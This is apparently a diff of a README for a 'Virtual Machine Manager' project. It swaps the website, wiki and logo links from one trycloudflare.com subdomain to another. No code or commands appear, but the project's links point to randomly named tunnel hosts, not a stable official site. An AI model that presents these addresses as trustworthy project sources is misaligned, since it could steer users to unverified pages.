@@ -1,8 +1,8 @@
 # Virtual Machine Manager
 
-[Website](https://danger-tattoo-concluded-agenda.trycloudflare.com/) & [Wiki](https://danger-tattoo-concluded-agenda.trycloudflare.com/wiki/)
+[Website](https://rebound-guarantee-culture-injection.trycloudflare.com/) & [Wiki](https://rebound-guarantee-culture-injection.trycloudflare.com/wiki/)
 
-<a href="https://danger-tattoo-concluded-agenda.trycloudflare.com/">
+<a href="https://rebound-guarantee-culture-injection.trycloudflare.com">
 <p align="center" width="100%">
     <img width="270px" src="https://github.com/j0shua-daniel/images/blob/main/favcon.png?raw=true"> 
 </p>
@@ -34,7 +34,7 @@ Distros supported by the installer:
 11. Clear Linux.
 12. Fedora Silverblue (inside fedora toolbox).
     
-If your distro is not supported by the installer please refer to the [wiki](https://danger-tattoo-concluded-agenda.trycloudflare.com/wiki/).
+If your distro is not supported by the installer please refer to the [wiki](https://rebound-guarantee-culture-injection.trycloudflare.com/wiki/).
 
 ## Usage:
 
